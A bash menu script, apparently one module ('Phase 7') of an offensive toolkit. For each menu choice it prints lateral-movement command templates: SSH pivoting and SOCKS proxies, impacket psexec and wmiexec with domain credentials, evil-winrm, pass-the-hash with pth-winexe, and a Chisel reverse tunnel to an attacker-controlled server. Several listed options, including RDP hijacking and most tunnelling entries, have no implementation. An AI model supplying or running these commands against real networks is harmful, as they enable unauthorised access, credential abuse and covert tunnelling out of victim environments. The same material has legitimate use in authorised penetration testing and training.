#!/bin/bash

#############################################################################
#                                                                           #
#  LATERAL MOVEMENT SUITE                                                  #
#  Phase 7: Move through the network                                        #
#                                                                           #
#  Includes:                                                               #
#  - SSH pivoting                                                          #
#  - RDP hijacking                                                         #
#  - WMI/psexec                                                            #
#  - Network tunneling                                                     #
#                                                                           #
#############################################################################

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║              LATERAL MOVEMENT SUITE                                       ║
║              Phase 7: Move through the network                             ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_menu() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  LATERAL MOVEMENT${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}SSH Pivoting${NC}"
    echo "   L1.  SSH Local Port Forward"
    echo "   L2.  SSH Remote Port Forward"
    echo "   L3.  SSH Dynamic SOCKS Proxy"
    echo "   L4.  SSH Jump Host"
    echo ""
    echo -e "${YELLOW}Windows Lateral Movement${NC}"
    echo "   LW1. psexec"
    echo "   LW2. WMI Execution"
    echo "   LW3. Pass-the-Hash"
    echo "   LW4. RDP Hijacking"
    echo ""
    echo -e "${YELLOW}Tunneling & Proxies${NC}"
    echo "   LT1. Chisel Tunnel"
    echo "   LT2. Ligolo Proxy"
    echo "   LT3. Port Forwarding"
    echo "   LT4. Reverse Tunnels"
    echo ""
    echo -e "${RED}0. Exit to Main Menu${NC}"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_good() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

usage() {
    cat << EOF
USAGE: $0 [OPTIONS]

OPTIONS:
    L1                      SSH local port forward
    LW1                     psexec
    --menu                  Show interactive menu
    --help                  Show this help

EXAMPLES:
    $0 L1 target 8080
    $0 --menu

EOF
}

handle_selection() {
    local choice="$1"
    shift
    
    case "$choice" in
        L1|l1)
            log_info "SSH Local Port Forward"
            echo "ssh -L <local_port>:<target>:<target_port> user@jump_host"
            ;;
        L2|l2)
            log_info "SSH Remote Port Forward"
            echo "ssh -R <remote_port>:<target>:<target_port> user@vps"
            ;;
        L3|l3)
            log_info "SSH Dynamic SOCKS Proxy"
            echo "ssh -D <local_proxy_port> user@jump_host"
            ;;
        L4|l4)
            log_info "SSH Jump Host"
            echo "ssh -J user@jump_host user@target"
            ;;
        LW1)
            log_info "psexec"
            echo "psexec.py domain/user:password@target"
            echo "impacket-psexec domain/user:password@target"
            ;;
        LW2)
            log_info "WMI Execution"
            echo "wmiexec.py domain/user:password@target"
            echo "evil-winrm -i target -u user -p password"
            ;;
        LW3)
            log_info "Pass-the-Hash"
            echo "pth-winexe -U domain/user%<hash> //target cmd"
            ;;
        LT1)
            log_info "Chisel Tunnel"
            echo "Server: chisel server --reverse --port 8080"
            echo "Client: chisel client <server>:8080 R:<local_port>:<target>:<target_port>"
            ;;
        --menu)
            banner
            show_menu
            read -p "Enter choice: " choice
            handle_selection "$choice"
            ;;
        --help|-h)
            usage
            ;;
        *)
            log_warn "Invalid choice: $choice"
            usage
            ;;
    esac
}

main() {
    if [[ $# -gt 0 ]]; then
        handle_selection "$@"
        exit 0
    fi
    
    while true; do
        banner
        show_menu
        
        echo ""
        read -p "Enter choice: " choice
        
        if [[ "$choice" == "0" ]]; then
            echo -e "${GREEN}Returning to main menu...${NC}"
            exit 0
        fi
        
        handle_selection "$choice"
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"
